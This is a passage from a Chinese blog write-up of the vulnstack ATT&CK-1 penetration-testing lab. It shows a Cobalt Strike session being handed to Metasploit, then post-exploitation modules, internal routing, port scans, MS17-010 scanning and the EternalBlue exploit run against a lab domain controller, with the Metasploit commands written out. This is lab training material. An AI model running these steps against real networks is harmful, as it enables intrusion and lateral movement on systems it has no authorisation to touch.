<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDKoL"><img src="https://i.imgtg.com/2022/06/02/nDKoL.png" alt="nDKoL.png"></a><br>2.CS开启监听<br>回到CS的客户端添加监听器，Payload为windows&#x2F;foreign&#x2F;reverse_http，IP为MSF的IP，监听端口为MSF监听的端口<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDy3t"><img src="https://i.imgtg.com/2022/06/02/nDy3t.png" alt="nDy3t.png"></a><br>3.进行派生会话，从CS-MSF，选择刚才创建的监听器<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDmix"><img src="https://i.imgtg.com/2022/06/02/nDmix.png" alt="nDmix.png"></a><br>返回kali的MSF获得shell会话<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDptj"><img src="https://i.imgtg.com/2022/06/02/nDptj.png" alt="nDptj.png"></a><br>4.MSF简单利用<br>调用post&#x2F;windows&#x2F;gather&#x2F;checkvm判断靶机是否为虚拟机<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDJ2p"><img src="https://i.imgtg.com/2022/06/02/nDJ2p.png" alt="nDJ2p.png"></a><br>调用post&#x2F;windows&#x2F;gather&#x2F;enum_applications模块枚举列出安装在靶机上的应用程序<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDRbU"><img src="https://i.imgtg.com/2022/06/02/nDRbU.png" alt="nDRbU.png"></a></p>
<h3 id="MSF进行永恒之蓝"><a href="#MSF进行永恒之蓝" class="headerlink" title="MSF进行永恒之蓝"></a>MSF进行永恒之蓝</h3><p>借助MSF集成的攻击模块拿下内网其他机器。</p>
<p>1.首先配置静态路由，MSF访问不到内网机器，可以在MSF基础上添加一条去往内网的路由，就可以使用MSF访问原本访问不到的内网资源。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">run</span> post/multi/manage/autoroute</span><br><span class="line">meterpreter &gt; <span class="built_in">run</span> post/multi/manage/autoroute <span class="attribute">SUBNET</span>=192.168.52.0 <span class="attribute">ACTION</span>=ADD</span><br></pre></td></tr></table></figure>
<p>添加失败，路由已经存在<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDHqq"><img src="https://i.imgtg.com/2022/06/02/nDHqq.png" alt="nDHqq.png"></a><br>2.返回MSF对内网主机探测端口</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">msf6</span> &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="attribute">msf6</span> &gt; set rhosts <span class="number">192.168.52.141</span> </span><br><span class="line"><span class="attribute">msf6</span> &gt; set ports <span class="number">80</span>,<span class="number">135</span>-<span class="number">139</span>,<span class="number">445</span>,<span class="number">3306</span>,<span class="number">3389</span></span><br><span class="line"><span class="attribute">msf6</span> &gt; run</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDLrc"><img src="https://i.imgtg.com/2022/06/02/nDLrc.png" alt="nDLrc.png"></a><br>发现开启了139和445端口，利用同方法对域控主机192.168.52.138进行端口扫描</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">msf6</span> &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="attribute">msf6</span> &gt; set rhosts <span class="number">192.168.52.138</span></span><br><span class="line"><span class="attribute">msf6</span> &gt; set ports <span class="number">80</span>,<span class="number">135</span>-<span class="number">139</span>,<span class="number">445</span>,<span class="number">3306</span>,<span class="number">3389</span></span><br><span class="line"><span class="attribute">msf6</span> &gt; run</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDEQr"><img src="https://i.imgtg.com/2022/06/02/nDEQr.png" alt="nDEQr.png"></a><br>3.使用ms17-010攻击<br>使用msf漏洞扫描模块进行扫描</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt;search ms17_010 <span class="comment">#搜索MSF集成的与ms17_010漏洞相关的模块</span></span><br><span class="line">msf6 &gt;use auxiliary/scanner/smb/smb_ms17_010 <span class="comment"># 加载扫描exp</span></span><br><span class="line">msf6 &gt;<span class="keyword">set</span> rhosts <span class="number">192.168</span><span class="number">.52</span><span class="number">.141</span> <span class="comment">#设置被扫描的主机IP</span></span><br><span class="line">msf6 &gt;<span class="built_in">run</span>  <span class="comment">#进行扫描，观察是否存在该漏洞</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>发现都存在ms17-010漏洞<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDSiG"><img src="https://i.imgtg.com/2022/06/02/nDSiG.png" alt="nDSiG.png"></a><br>使用exp进行攻击</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf6 &gt; <span class="keyword">set</span> rhost <span class="comment">192.168.52.138</span></span><br><span class="line">msf6 <span class="comment">&gt; run</span></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nDu6K"><img src="https://i.imgtg.com/2022/06/02/nDu6K.png" alt="nDu6K.png"></a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>大体思路如下<br><img src="https://i.imgtg.com/2022/06/27/Nxhka.png" alt="Nxhka.png"><br>对于内网我参考了很多博主，也学习到一些思路和原理。在正常渗透测试中，不可能一帆风顺。要知道原理，尝试不同的方法。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_31773159/article/details/113910351">msf各种弱口令爆破</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/114184542">phpmyadmin渗透利用</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/268593.html">内网信息收集</a><br><a target="_blank" rel="noopener" href="https://bwshen.blog.csdn.net/article/details/118338328">windows域环境身份认证与攻击思路</a><br><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/632621.html">域内密码抓取方法总结</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/107856140">CS与MSF之间的会话派发与端口转发</a></p>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>l3ife
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://example.com/2022/10/04/[vulnstack]ATT&CK%E6%94%BB%E5%87%BB-1/" title="ATT&amp;CK-1">http://example.com/2022/10/04/[vulnstack]ATT&CK攻击-1/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E5%86%85%E7%BD%91/" rel="tag"># 内网</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item"></div>
      <div class="post-nav-item">
    <a href="/2022/10/04/%E6%97%A5%E8%AE%B0-%E6%AF%8F%E6%97%A5%E4%B8%80%E8%AE%B0%E4%BD%8F/" rel="next" title="猪猪侠大佬">
      猪猪侠大佬 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4"><span class="nav-number">3.</span> <span class="nav-text">外网突破</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3306%E7%AB%AF%E5%8F%A3%E8%AF%95%E6%8E%A2"><span class="nav-number">3.2.</span> <span class="nav-text">3306端口试探</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mysql%E5%86%99%E6%97%A5%E5%BF%97shell"><span class="nav-number">3.3.</span> <span class="nav-text">Mysql写日志shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="nav-number">4.</span> <span class="nav-text">内网探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CS-Backdoor%E4%B8%8A%E7%BA%BF"><span class="nav-number">4.1.</span> <span class="nav-text">CS Backdoor上线</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.2.</span> <span class="nav-text">域内信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="nav-number">5.</span> <span class="nav-text">内网横向渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CS%E6%B4%BE%E7%94%9F%E4%BC%9A%E8%AF%9D%E7%BB%99MSF"><span class="nav-number">5.1.</span> <span class="nav-text">CS派生会话给MSF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF%E8%BF%9B%E8%A1%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D"><span class="nav-number">5.2.</span> <span class="nav-text">MSF进行永恒之蓝</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">7.</span> <span class="nav-text">参考</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">l3ife</p>
  <div class="site-description" itemprop="description">谁想当安全混子呢</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">2</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
	  

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">l3ife</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
